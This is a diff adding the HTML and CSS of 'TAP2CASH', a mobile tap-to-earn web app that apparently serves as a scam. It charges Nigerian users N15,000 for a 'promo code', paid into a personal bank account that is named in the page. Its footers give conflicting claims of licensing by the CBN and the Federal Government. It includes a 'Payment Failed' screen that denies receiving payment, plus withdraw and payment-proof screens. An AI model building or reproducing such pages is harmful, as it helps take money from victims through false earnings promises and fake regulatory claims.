+        .history-item-title { color: #fff; font-size: 14px; font-weight: 600; margin-bottom: 2px; }
+        .history-item-time { color: #666; font-size: 12px; }
+        .history-item-amount { text-align: right; }
+        .history-item-amount.earn { color: #ffd700; font-size: 15px; font-weight: 700; }
+        .history-item-amount.processing { color: #00e676; font-size: 15px; font-weight: 700; }
+        .history-item-amount.submitted { color: #4fc3f7; font-size: 15px; font-weight: 700; }
+        .history-item-amount.withdraw { color: #00e676; font-size: 15px; font-weight: 700; }
+
+        /* ===== WITHDRAW SCREEN ===== */
+
+        .withdraw-screen {
+
+            position: absolute;
+
+            top: 0;
+
+            left: 0;
+
+            width: 100%;
+
+            height: 100%;
+
+            background: #0f1629;
+
+            display: none;
+
+            flex-direction: column;
+
+            z-index: 27;
+
+            overflow: hidden;
+
+        }
+
+        .withdraw-screen.active {
+
+            display: flex;
+
+        }
+
+        .withdraw-header {
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: space-between;
+
+            padding: 12px 20px;
+
+            background: #1a237e;
+
+            flex-shrink: 0;
+
+        }
+
+        .withdraw-header .back-arrow {
+
+            background: none;
+
+            border: none;
+
+            color: #fff;
+
+            font-size: 22px;
+
+            cursor: pointer;
+
+            width: 36px;
+
+            height: 36px;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+        }
+
+        .withdraw-header .withdraw-title {
+
+            font-size: 18px;
+
+            font-weight: 700;
+
+            letter-spacing: 2px;
+
+            color: #fff;
+
+        }
+
+        .withdraw-header .star-btn {
+
+            background: none;
+
+            border: none;
+
+            color: #fff;
+
+            font-size: 20px;
+
+            cursor: pointer;
+
+            width: 36px;
+
+            height: 36px;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+        }
+
+        .withdraw-content {
+
+            flex: 1;
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            padding: 16px 20px 20px;
+
+            overflow-y: auto;
+
+            -webkit-overflow-scrolling: touch;
+
+        }
+
+        .withdraw-balance-card {
+
+            width: 100%;
+
+            background: #1a237e;
+
+            border-radius: 16px;
+
+            padding: 14px 16px;
+
+            text-align: center;
+
+            margin-bottom: 14px;
+
+            border: 2px solid #283593;
+
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+
+        }
+
+        .withdraw-balance-title {
+
+            color: #fff;
+
+            font-size: 15px;
+
+            font-weight: 700;
+
+            margin-bottom: 10px;
+
+            letter-spacing: 1px;
+
+        }
+
+        .withdraw-balance-divider {
+
+            height: 3px;
+
+            background: linear-gradient(90deg, transparent, #ffd700, transparent);
+
+            margin-bottom: 15px;
+
+        }
+
+        .withdraw-balance-row {
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            gap: 15px;
+
+            flex-wrap: wrap;
+
+        }
+
+        .withdraw-balance-item {
+
+            display: flex;
+
+            align-items: center;
+
+            gap: 8px;
+
+        }
+
+        .withdraw-balance-icon {
+
+            width: 32px;
+
+            height: 32px;
+
+            border-radius: 50%;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            font-size: 14px;
+
+            font-weight: 900;
+
+            flex-shrink: 0;
+
+        }
+
+        .withdraw-balance-icon.gold {
+
+            background: #ffd700;
+
+            color: #8b6914;
+
+        }
+
+        .withdraw-balance-icon.green {
+
+            background: #00e676;
+
+            color: #004d40;
+
+        }
+
+        .withdraw-balance-label {
+
+            color: #aaa;
+
+            font-size: 13px;
+
+            font-weight: 500;
+
+        }
+
+        .withdraw-balance-value {
+
+            color: #ffd700;
+
+            font-size: 18px;
+
+            font-weight: 800;
+
+        }
+
+        .withdraw-balance-value.green {
+
+            color: #00e676;
+
+        }
+
+        .withdraw-convert-text {
+
+            color: #888;
+
+            font-size: 12px;
+
+            font-weight: 500;
+
+        }
+
+        .withdraw-form {
+
+            width: 100%;
+
+            display: flex;
+
+            flex-direction: column;
+
+            gap: 10px;
+
+            margin-bottom: 14px;
+
+        }
+
+        .withdraw-input-group {
+
+            width: 100%;
+
+        }
+
+        .withdraw-input-wrapper {
+
+            background: #1a237e;
+
+            border: 2px solid #283593;
+
+            border-radius: 12px;
+
+            padding: 12px 16px;
+
+            transition: all 0.3s ease;
+
+        }
+
+        .withdraw-input-wrapper:focus-within {
+
+            border-color: #ffd700;
+
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.1);
+
+        }
+
+        .withdraw-input-label {
+
+            display: block;
+
+            color: #aaa;
+
+            font-size: 12px;
+
+            margin-bottom: 4px;
+
+            font-weight: 500;
+
+        }
+
+        .withdraw-input-field {
+
+            width: 100%;
+
+            background: transparent;
+
+            border: none;
+
+            color: #fff;
+
+            font-size: 15px;
+
+            outline: none;
+
+            padding: 2px 0;
+
+            font-weight: 400;
+
+        }
+
+        .withdraw-input-field::placeholder {
+
+            color: #555;
+
+        }
+
+        .withdraw-btn {
+
+            width: 100%;
+
+            padding: 15px;
+
+            border: none;
+
+            border-radius: 16px;
+
+            font-size: 16px;
+
+            font-weight: 800;
+
+            letter-spacing: 2px;
+
+            cursor: pointer;
+
+            transition: all 0.3s ease;
+
+            text-transform: uppercase;
+
+            margin-bottom: 10px;
+
+            flex-shrink: 0;
+
+            background: linear-gradient(180deg, #00c853 0%, #00a344 50%, #008f39 100%);
+
+            color: white;
+
+            box-shadow: 
+
+                0 4px 15px rgba(0, 200, 83, 0.3),
+
+                inset 0 1px 0 rgba(255,255,255,0.2),
+
+                inset 0 -2px 0 rgba(0,0,0,0.2);
+
+            position: relative;
+
+            overflow: hidden;
+
+        }
+
+        .withdraw-btn::before {
+
+            content: '';
+
+            position: absolute;
+
+            top: 6px;
+
+            left: 10px;
+
+            right: 10px;
+
+            height: 35%;
+
+            background: linear-gradient(180deg, rgba(255,255,255,0.15) 0%, rgba(255,255,255,0.05) 100%);
+
+            border-radius: 8px;
+
+            pointer-events: none;
+
+        }
+
+        .withdraw-btn:hover {
+
+            background: linear-gradient(180deg, #00e676 0%, #00c853 50%, #00a344 100%);
+
+            box-shadow: 
+
+                0 6px 20px rgba(0, 200, 83, 0.4),
+
+                0 10px 40px rgba(0, 200, 83, 0.2),
+
+                inset 0 1px 0 rgba(255,255,255,0.2),
+
+                inset 0 -2px 0 rgba(0,0,0,0.2);
+
+            transform: translateY(-2px);
+
+        }
+
+        .withdraw-btn:active {
+
+            transform: scale(0.98) translateY(0);
+
+        }
+
+        .withdraw-btn:disabled {
+
+            opacity: 0.5;
+
+            cursor: not-allowed;
+
+            transform: none;
+
+        }
+
+
+
+        /* ===== CONFIRM SCREEN ===== */
+
+        .confirm-screen, .payment-screen {
+
+            position: absolute;
+
+            top: 0; left: 0;
+
+            width: 100%; height: 100%;
+
+            background: #0f1629;
+
+            display: none;
+
+            flex-direction: column;
+
+            z-index: 28;
+
+            overflow: hidden;
+
+        }
+
+        .confirm-screen.active, .payment-screen.active { display: flex; }
+
+        .confirm-header, .payment-header {
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: space-between;
+
+            padding: 14px 20px;
+
+            background: #1a237e;
+
+            flex-shrink: 0;
+
+        }
+
+        .confirm-header-title, .payment-header-title {
+
+            font-size: 17px;
+
+            font-weight: 800;
+
+            letter-spacing: 2px;
+
+            color: #fff;
+
+        }
+
+        .confirm-back, .payment-back {
+
+            background: none; border: none;
+
+            color: #fff; font-size: 22px;
+
+            cursor: pointer; width: 36px; height: 36px;
+
+            display: flex; align-items: center; justify-content: center;
+
+        }
+
+        .confirm-content, .payment-content {
+
+            flex: 1;
+
+            overflow-y: auto;
+
+            -webkit-overflow-scrolling: touch;
+
+            padding: 6px 12px 6px;
+
+            display: flex;
+
+            flex-direction: column;
+
+            gap: 8px;
+
+        }
+
+        /* Details card */
+
+        .details-card {
+
+            background: #1a237e;
+
+            border-radius: 16px;
+
+            border: 1.5px solid #283593;
+
+            overflow: hidden;
+
+        }
+
+        .details-card-title {
+
+            text-align: center;
+
+            font-size: 15px;
+
+            font-weight: 700;
+
+            color: #fff;
+
+            padding: 12px;
+
+            border-bottom: 1px solid #283593;
+
+            letter-spacing: 1px;
+
+        }
+
+        .details-row {
+
+            display: flex;
+
+            justify-content: space-between;
+
+            align-items: center;
+
+            padding: 11px 16px;
+
+            border-bottom: 1px solid #1c2770;
+
+        }
+
+        .details-row:last-child { border-bottom: none; }
+
+        .details-label { color: #888; font-size: 13px; }
+
+        .details-value { color: #fff; font-size: 14px; font-weight: 700; }
+
+        .details-value.gold { color: #ffd700; font-size: 16px; }
+
+        .details-value.green { color: #00e676; }
+
+        /* Processing card */
+
+        .processing-card {
+
+            background: #1a237e;
+
+            border: 2px solid #ffd700;
+
+            border-radius: 16px;
+
+            padding: 18px 16px;
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            gap: 10px;
+
+            text-align: center;
+
+        }
+
+        .processing-icon {
+
+            width: 48px; height: 48px;
+
+            background: #ffd700;
+
+            border-radius: 50%;
+
+            display: flex; align-items: center; justify-content: center;
+
+            font-size: 22px; font-weight: 900; color: #8b6914;
+
+        }
+
+        .processing-title {
+
+            color: #ffd700; font-size: 17px; font-weight: 800;
+
+        }
+
+        .processing-text {
+
+            color: #aaa; font-size: 13px; line-height: 1.6;
+
+        }
+
+        .processing-dots {
+
+            display: flex; gap: 6px;
+
+        }
+
+        .processing-dots span {
+
+            width: 8px; height: 8px;
+
+            background: #ffd700;
+
+            border-radius: 50%;
+
+            animation: dotBounce 1.2s infinite;
+
+            opacity: 0.3;
+
+        }
+
+        .processing-dots span:nth-child(2) { animation-delay: 0.2s; }
+
+        .processing-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        .processing-dots span:nth-child(4) { animation-delay: 0.6s; }
+
+        .processing-dots span:nth-child(5) { animation-delay: 0.8s; }
+
+        @keyframes dotBounce {
+
+            0%,100% { opacity: 0.3; transform: scale(1); }
+
+            50% { opacity: 1; transform: scale(1.3); }
+
+        }
+
+        @keyframes fadeInUp {
+
+            from { opacity: 0; transform: translateY(16px); }
+
+            to { opacity: 1; transform: translateY(0); }
+
+        }
+
+        .proceed-btn {
+
+            width: 100%; padding: 17px;
+
+            border: none; border-radius: 16px;
+
+            font-size: 17px; font-weight: 800;
+
+            letter-spacing: 2px; cursor: pointer;
+
+            background: linear-gradient(180deg, #00c853 0%, #00a344 50%, #008f39 100%);
+
+            color: #fff;
+
+            box-shadow: 0 4px 20px rgba(0,200,83,0.4), inset 0 1px 0 rgba(255,255,255,0.2);
+
+            text-transform: uppercase;
+
+            flex-shrink: 0;
+
+        }
+
+        .proceed-btn:active { transform: scale(0.97); }
+
+        /* Payment screen */
+
+        .payment-amount-card {
+
+            background: #1a237e;
+
+            border: 2px solid #ffd700;
+
+            border-radius: 16px;
+
+            padding: 18px;
+
+            text-align: center;
+
+        }
+
+        .payment-amount-label { color: #aaa; font-size: 13px; margin-bottom: 6px; }
+
+        .payment-amount-value { color: #ffd700; font-size: 38px; font-weight: 900; }
+
+        .payment-amount-sub { color: #666; font-size: 12px; margin-top: 4px; }
+
+        .pay-to-card {
+
+            background: #1a237e;
+
+            border-radius: 16px;
+
+            border: 1.5px solid #283593;
+
+            overflow: hidden;
+
+        }
+
+        .pay-to-title {
+
+            text-align: center; font-size: 14px;
+
+            font-weight: 700; color: #fff;
+
+            padding: 11px; border-bottom: 1px solid #283593;
+
+            letter-spacing: 1px;
+
+        }
+
+        .warning-card {
+
+            background: #2d1a00;
+
+            border: 2px solid #e65100;
+
+            border-radius: 16px;
+
+            padding: 14px 16px;
+
+            display: flex; align-items: flex-start; gap: 12px;
+
+        }
+
+        .warning-icon { font-size: 24px; flex-shrink: 0; margin-top: 2px; }
+
+        .warning-title { color: #ff9800; font-size: 15px; font-weight: 800; margin-bottom: 4px; }
+
+        .warning-text { color: #ffcc80; font-size: 13px; line-height: 1.5; }
+
+        .upload-card {
+
+            background: #1a237e;
+
+            border-radius: 16px;
+
+            border: 1.5px solid #283593;
+
+            overflow: hidden;
+
+        }
+
+        .upload-title {
+
+            text-align: center; font-size: 14px;
+
+            font-weight: 700; color: #fff;
+
+            padding: 11px; border-bottom: 1px solid #283593;
+
+            letter-spacing: 1px;
+
+        }
+
+        .upload-area {
+
+            padding: 20px 16px;
+
+            display: flex; flex-direction: column;
+
+            align-items: center; gap: 10px;
+
+        }
+
+        .upload-btn-circle {
+
+            width: 60px; height: 60px;
+
+            border-radius: 50%;
+
+            background: #283593;
+
+            border: 2px dashed #3949ab;
+
+            display: flex; align-items: center; justify-content: center;
+
+            font-size: 28px; color: #7986cb;
+
+            cursor: pointer; transition: all 0.2s;
+
+        }
+
+        .upload-btn-circle:active { background: #3949ab; }
+
+        .upload-hint { color: #666; font-size: 13px; text-align: center; }
+
+        .upload-preview {
+
+            width: 100%; max-height: 160px;
+
+            object-fit: cover; border-radius: 10px;
+
+            display: none;
+
+        }
+
+        .submit-btn {
+
+            width: 100%; padding: 17px;
+
+            border: none; border-radius: 16px;
+
+            font-size: 17px; font-weight: 800;
+
+            letter-spacing: 2px; cursor: pointer;
+
+            background: linear-gradient(180deg, #00c853 0%, #00a344 50%, #008f39 100%);
+
+            color: #fff;
+
+            box-shadow: 0 4px 20px rgba(0,200,83,0.4), inset 0 1px 0 rgba(255,255,255,0.2);
+
+            text-transform: uppercase;
+
+            flex-shrink: 0;
+
+        }
+
+        .submit-btn:active { transform: scale(0.97); }
+
+
+        /* ===== CBN FOOTER ===== */
+        .cbn-footer {
+            text-align: center;
+            padding: 6px 16px 8px;
+            background: linear-gradient(180deg, transparent, rgba(0,0,0,0.5));
+            flex-shrink: 0;
+            width: 100%;
+            box-sizing: border-box;
+            overflow: hidden;
+        }
+        .cbn-footer-text {
+            font-size: 9.5px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+            background: linear-gradient(90deg, #b8860b, #ffd700, #fff7a0, #ffd700, #b8860b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: none;
+            display: block;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .cbn-footer-line {
+            width: 60px;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #ffd700, transparent);
+            margin: 2px auto;
+        }
+        
+        /* ===== PROCESSING SCREEN ===== */
+        .processing-screen {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #0f1629;
+            display: none;
+            flex-direction: column;
+            z-index: 35;
+            justify-content: center;
+            align-items: center;
+            padding: 30px 24px;
+            box-sizing: border-box;
+        }
+        .processing-screen.active { display: flex; }
+
+        .proc-step {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 14px;
+            margin-bottom: 14px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            min-height: 56px;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: all 0.5s ease;
+        }
+        .proc-step.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .proc-step.done { border-color: rgba(0,230,118,0.3); background: rgba(0,230,118,0.06); }
+        .proc-step.active-step { border-color: rgba(255,215,0,0.4); background: rgba(255,215,0,0.06); }
+
+        .proc-icon { font-size: 24px; flex-shrink: 0; }
+        .proc-text { font-size: 14px; font-weight: 600; color: #fff; flex: 1; }
+        .proc-status { font-size: 18px; flex-shrink: 0; }
+
+        .proc-spinner {
+            width: 20px; height: 20px;
+            border: 2px solid rgba(255,215,0,0.3);
+            border-top-color: #ffd700;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            flex-shrink: 0;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ===== SUCCESS SCREEN ===== */
+        .success-screen {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #0f1629;
+            display: none;
+            flex-direction: column;
+            z-index: 36;
+            justify-content: center;
+            align-items: center;
+            padding: 30px 24px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .success-screen.active { display: flex; }
+
+        .success-checkmark {
+            width: 90px; height: 90px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00c853, #00e676);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 44px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 0 12px rgba(0,230,118,0.1), 0 0 0 24px rgba(0,230,118,0.05);
+            animation: popIn 0.5s cubic-bezier(0.175,0.885,0.32,1.275);
+        }
+        @keyframes popIn {
+            0% { transform: scale(0); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .success-title {
+            font-size: 22px; font-weight: 900;
+            color: #00e676; margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+        .success-amount {
+            font-size: 32px; font-weight: 900;
+            color: #fff; margin-bottom: 6px;
+        }
+        .success-bank {
+            font-size: 14px; color: #aaa; margin-bottom: 20px;
+        }
+        .success-info-box {
+            background: rgba(0,230,118,0.08);
+            border: 1px solid rgba(0,230,118,0.25);
+            border-radius: 14px;
+            padding: 16px 20px;
+            margin-bottom: 24px;
+            width: 100%;
+        }
+        .success-info-box p {
+            font-size: 13px; color: #ccc; line-height: 1.6; margin: 0;
+        }
+        .success-info-box strong { color: #00e676; }
+        .success-home-btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
+            background: linear-gradient(135deg, #00c853, #00e676);
+            color: #000;
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            cursor: pointer;
+        }
+        </style>
+
+</head>
+
+<body>
+
+
+
+<div class="app-container">
+
+    <!-- LOGIN SCREEN -->
+
+    <div id="loginScreen" class="auth-screen">
+
+        <div class="auth-content">
+
+            <div class="logo-container">
+
+                <div class="coin-outer"><div class="coin-inner"><span class="naira-symbol">N</span></div></div>
+
+            </div>
+
+            <h1 class="brand-name">TAP2CASH</h1>
+
+            <p class="subtitle">Login or Signup</p>
+
+            <div id="loginMessage" class="message"></div>
+
+            <div class="form-group">
+
+                <div class="input-wrapper">
+
+                    <label class="input-label">Phone Number</label>
+
+                    <div class="phone-input-wrapper">
+
+                        <span class="country-code">+234</span>
+
+                        <input type="tel" id="loginPhone" class="input-field" placeholder="Enter phone number" maxlength="11">
+
+                    </div>
+
+                </div>
+
+            </div>
+
+            <div class="form-group">
+
+                <div class="input-wrapper">
+
+                    <label class="input-label">Password</label>
+
+                    <input type="password" id="loginPassword" class="input-field" placeholder="Enter password">
+
+                    <button class="password-toggle" onclick="togglePassword('loginPassword',this)">👁</button>
+
+                </div>
+
+            </div>
+
+            <button class="auth-btn btn-green" id="loginBtn" onclick="handleLogin()">LOGIN</button>
+            <div class="cbn-footer">
+                <div class="cbn-footer-line"></div>
+                <div class="cbn-footer-text">🇳🇬 RC: 7829341 &nbsp;|&nbsp; Licensed by Federal Government of Nigeria &nbsp;|&nbsp; © 2026 TAP2CASH Nigeria Ltd.</div>
+                <div class="cbn-footer-line"></div>
+            </div>
+
+            <div class="divider">or</div>
+
+            <button class="auth-btn btn-blue" onclick="showAuthScreen('signupScreen')">SIGN UP</button>
+
+            <a href="#" class="forgot-link">Forgot Password?</a>
+
+        </div>
+
+        <div class="safe-area-bottom"></div>
+
+    </div>
+
+
+
+    <!-- SIGNUP SCREEN -->
+
+    <div id="signupScreen" class="auth-screen hidden-right">
+
+        <div class="auth-header">
+
+            <button class="back-btn" onclick="showAuthScreen('loginScreen')">←</button>
+
+            <div class="auth-header-title">Create Account</div>
+
+        </div>
+
+        <div class="auth-content">
+
+            <div class="logo-container">
+
+                <div class="coin-outer"><div class="coin-inner"><span class="naira-symbol">N</span></div></div>
+
+            </div>
+
+            <h1 class="brand-name">TAP2CASH</h1>
+
+            <div id="signupMessage" class="message"></div>
+
+            <div class="form-group">
+
+                <div class="input-wrapper">
+
+                    <label class="input-label">First Name</label>
+
+                    <input type="text" id="firstName" class="input-field" placeholder="Enter first name">
+
+                </div>
+
+            </div>
+
+            <div class="form-group">
+
+                <div class="input-wrapper">
+
+                    <label class="input-label">Last Name</label>
+
+                    <input type="text" id="lastName" class="input-field" placeholder="Enter last name">
+
+                </div>
+
+            </div>
+
+            <div class="form-group">
+
+                <div class="input-wrapper">
+
+                    <label class="input-label">Phone Number</label>
+
+                    <div class="phone-input-wrapper">
+
+                        <span class="country-code">+234</span>
+
+                        <input type="tel" id="signupPhone" class="input-field" placeholder="Enter phone number" maxlength="11">
+
+                    </div>
+
+                </div>
+
+            </div>
+
+            <div class="form-group">
+
+                <div class="input-wrapper">
+
+                    <label class="input-label">Password</label>
+
+                    <input type="password" id="signupPassword" class="input-field" placeholder="Enter password">
+
+                    <button class="password-toggle" onclick="togglePassword('signupPassword',this)">👁</button>
+
+                </div>
+
+            </div>
+
+            <div class="form-group">
+
+                <div class="input-wrapper">
+
+                    <label class="input-label">Confirm Password</label>
+
+                    <input type="password" id="confirmPassword" class="input-field" placeholder="Confirm password">
+
+                    <button class="password-toggle" onclick="togglePassword('confirmPassword',this)">👁</button>
+
+                </div>
+
+            </div>
+
+            <button class="auth-btn btn-blue" onclick="handleSignup()" id="signupBtn">CREATE ACCOUNT</button>
+            <div class="cbn-footer">
+                <div class="cbn-footer-line"></div>
+                <div class="cbn-footer-text">🇳🇬 RC: 7829341 &nbsp;|&nbsp; Licensed by CBN &nbsp;|&nbsp; © 2026 TAP2CASH Nigeria Ltd.</div>
+                <div class="cbn-footer-line"></div>
+            </div>
+
+            <div style="margin-top:18px;text-align:center;flex-shrink:0">
+
+                <p style="color:#777;font-size:14px">Already have an account?</p>
+
+                <a href="#" onclick="showAuthScreen('loginScreen')" style="color:#4caf50;text-decoration:none;font-weight:700;font-size:15px;display:inline-block;margin-top:5px">LOGIN</a>
+
+            </div>
+
+            <div class="footer-text">
+
+                By creating an account, you agree to our<br>
+
+                <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
+
+            </div>
+
+        </div>
+
+        <div class="safe-area-bottom"></div>
+
+    </div>
+
+
+
+    <!-- PROMO LOGIN SCREEN -->
+
+    <div id="promoScreen" class="promo-screen">
+
+        <div class="promo-header">
+
+            <button class="menu-btn" onclick="logout()">☰</button>
+
+            <div class="header-title">TAP2CASH</div>
+
+            <div style="width:24px"></div>
+
+        </div>
+
+        <!-- Top decorative section -->
+
+        <div class="promo-top">
+
+            <button class="buy-promo-btn" onclick="showBuyScreen()">Buy Promo Code</button>
+
+            <div class="promo-coin-container">
+
+                <div class="promo-coin-outer"><div class="promo-coin-inner"><span class="promo-naira">₦</span></div></div>
+
+            </div>
+
+            <h1 class="promo-brand">TAP2CASH</h1>
+
+            <p class="promo-tagline">Tap & Earn Real Money</p>
+
+        </div>
+
+        <!-- Code display -->
+
+        <div class="promo-code-box" id="promoCodeBox">
+
+            <div class="promo-code-label">Login with Promo</div>
+
+            <div class="promo-code-placeholder" id="promoCodeDisplay">Enter promo code</div>
+
+        </div>
+
+        <!-- Keypad -->
+
+        <div class="keypad-container">
+
+            <div class="keypad-row">
+
+                <button class="keypad-btn" onclick="enterDigit('1')">1</button>
+
+                <button class="keypad-btn" onclick="enterDigit('2')">2</button>
+
+                <button class="keypad-btn" onclick="enterDigit('3')">3</button>
+
+            </div>
+
+            <div class="keypad-row">
+
+                <button class="keypad-btn" onclick="enterDigit('4')">4</button>
+
+                <button class="keypad-btn" onclick="enterDigit('5')">5</button>
+
+                <button class="keypad-btn" onclick="enterDigit('6')">6</button>
+
+            </div>
+
+            <div class="keypad-row">
+
+                <button class="keypad-btn" onclick="enterDigit('7')">7</button>
+
+                <button class="keypad-btn" onclick="enterDigit('8')">8</button>
+
+                <button class="keypad-btn" onclick="enterDigit('9')">9</button>
+
+            </div>
+
+            <div class="keypad-row">
+
+                <button class="keypad-btn" onclick="enterDigit('0')">0</button>
+
+                <button class="keypad-btn" onclick="backspace()">⌫</button>
+
+                <button class="keypad-btn" onclick="enterDigit('00')">00</button>
+
+            </div>
+
+        </div>
+
+        <!-- CLEAR + LOGIN always visible at bottom -->
+        <div class="promo-actions">
+
+            <button class="clear-btn" onclick="clearPromoCode()">CLEAR</button>
+
+            <button class="promo-login-btn" onclick="promoLogin()" id="promoLoginBtn">LOGIN</button>
+
+        </div>
+        <div style="text-align:center;padding:4px 16px 6px;background:#111"><div class="cbn-footer-line"></div><div class="cbn-footer-text">🇳🇬 RC: 7829341 &nbsp;|&nbsp; Licensed by Federal Government of Nigeria &nbsp;|&nbsp; © 2026 TAP2CASH Nigeria Ltd.</div><div class="cbn-footer-line"></div></div>
+
+    </div>
+
+
+
+    <!-- BUY PROMO SCREEN -->
+
+    <div id="buyScreen" class="buy-screen">
+
+        <div class="buy-header">
+
+            <button class="back-btn" onclick="showPromoScreen()">←</button>
+
+            <div class="auth-header-title">Buy Promo Code</div>
+
+        </div>
+
+        <div class="buy-content">
+
+            <div class="buy-coin-container">
+
+                <div class="buy-coin-outer"><div class="buy-coin-inner"><span class="buy-naira">N</span></div></div>
+
+            </div>
+
+            <h1 class="buy-brand">TAP2CASH</h1>
+
+            <div class="price-card">
+
+                <div class="price-label">Get Your Promo Code</div>
+
+                <div class="price-value"><span>N</span> 15,000</div>
+
+            </div>
+
+            <div class="bank-card">
+
+                <div class="bank-card-title">Pay To This Account</div>
+
+                <div class="bank-divider"></div>
+
+                <div class="bank-row"><span class="bank-label">Bank:</span><span class="bank-value">9 Payment Service Bank</span></div>
+
+                <div class="bank-row"><span class="bank-label">Account Name:</span><span class="bank-value">David</span></div>
+
+                <div class="bank-row">
+
+                    <span class="bank-label">Account Number:</span>
+
+                    <span class="bank-value acct-num" id="acctNum" onclick="copyAccount()">
+
+                        6092973068
+
+                        <button class="copy-btn" id="copyBtn" onclick="event.stopPropagation();copyAccount()">Copy</button>
+
+                    </span>
+
+                </div>
+
+                <div class="bank-note">
+
+                    After payment, your promo code<br>
+
+                    will be sent to your phone number<br>
+
+                    <span class="highlight">within 10 minutes</span>
+
+                </div>
+
+            </div>
+
+            <button class="buy-action-btn" onclick="processPayment()">BUY PROMO CODE</button>
+            <div class="cbn-footer" style="margin-top:8px">
+                <div class="cbn-footer-line"></div>
+                <div class="cbn-footer-text">🇳🇬 RC: 7829341 &nbsp;|&nbsp; Licensed by CBN &nbsp;|&nbsp; © 2026 TAP2CASH Nigeria Ltd.</div>
+                <div class="cbn-footer-line"></div>
+            </div>
+
+            <div class="buy-footer-note">
+
+                Make sure to use your registered<br>
+
+                phone number for payment
+
+            </div>
+
+        </div>
+
+        <div class="safe-area-bottom"></div>
+
+    </div>
+
+
+
+    <!-- PAYMENT FAILED SCREEN -->
+
+    <div id="failedScreen" class="failed-screen">
+
+        <div class="failed-header">
+
+            <button class="back-btn" onclick="backToBuy()">←</button>
+
+            <div class="auth-header-title">Payment Failed</div>
+
+        </div>
+
+        <div class="failed-content">
+
+            <div class="failed-icon-container"><span class="failed-x">✕</span></div>
+
+            <h1 class="failed-title">Payment Failed</h1>
+
+            <div class="status-box">
+
+                <div class="status-box-title">Transaction Status</div>
+
+                <div class="status-box-divider"></div>
+
+                <div class="status-box-message">
+
+                    We did not receive<br>
+
+                    any payment from you.
+
+                </div>
+
+                <div class="status-box-sub">
+
+                    Please check your bank<br>
+
+                    and try again.<br><br>
+
+                    If you have paid, contact<br>
+
+                    <a href="#" class="contact-link" onclick="showToast('Contact support: support@tap2cash.com','success')">support with proof</a>.
+
+                </div>
+
+            </div>
+
+            <button class="retry-btn" onclick="retryPayment()">TRY AGAIN</button>
+            <div class="cbn-footer">
+                <div class="cbn-footer-line"></div>
+                <div class="cbn-footer-text">🇳🇬 RC: 7829341 &nbsp;|&nbsp; Licensed by CBN &nbsp;|&nbsp; © 2026 TAP2CASH Nigeria Ltd.</div>
+                <div class="cbn-footer-line"></div>
+            </div>
+
+            <button class="back-home-btn" onclick="backToPromo()">BACK TO HOME</button>
+
+            <div class="failed-footer">No payment detected.</div>
+
+        </div>
+
+        <div class="safe-area-bottom"></div>
+
+    </div>
+
+
+
+    <!-- DASHBOARD SCREEN -->
+
+    <div id="dashboardScreen" class="dashboard-screen">
+
+        <div class="dash-header">
+
+            <button class="back-arrow" onclick="logout()">←</button>
+
+            <div class="dash-title">TAP2CASH</div>
+
+            <button class="star-btn" onclick="showContactModal()">🎧</button>
+
+        </div>
+
+        <div class="dash-content">
+
+            <div class="stats-row">
+
+                <div class="stat-card coins-card">
+
+                    <div class="stat-icon gold">N</div>
+
+                    <div class="stat-info">
+
+                        <span class="stat-label">Coins:</span>
+
+                        <span class="stat-value" id="coinCount">0</span>
+
+                    </div>
+
+                </div>
+
+                <div class="stat-card naira-card">
+
+                    <div class="stat-icon green">N</div>
+
+                    <div class="stat-info">
+
+                        <span class="stat-label">Naira:</span>
+
+                        <span class="stat-value naira-val" id="nairaCount">0.00</span>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+            <div class="rate-bar">
+
+                <span class="rate-text">1 Coin = N 120 &nbsp;|&nbsp; 10 taps = 1 coin</span>
+
+            </div>
+
+            <p class="tap-instruction">Tap the coin to earn</p>
+
+            <div class="tap-coin-area" id="tapCoinArea" onclick="handleCoinTap(event)">
+
+                <div class="tap-ring"></div>
+
+                <div class="tap-ring"></div>
+
+                <div class="tap-ring"></div>
+
+                <div class="tap-coin-outer">
+
+                    <div class="tap-coin-inner">
+
+                        <span class="tap-naira">₦</span>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+
+
+            <!-- Tap progress bar -->
+
+            <div style="width:100%;margin-bottom:10px">
+
+                <div style="display:flex;justify-content:space-between;margin-bottom:5px">
+
+                    <span style="color:#888;font-size:12px">Tap Progress</span>
+
+                    <span style="color:#ffd700;font-size:12px;font-weight:700" id="tapProgressLabel">0 / 10 taps</span>
+
+                </div>
+
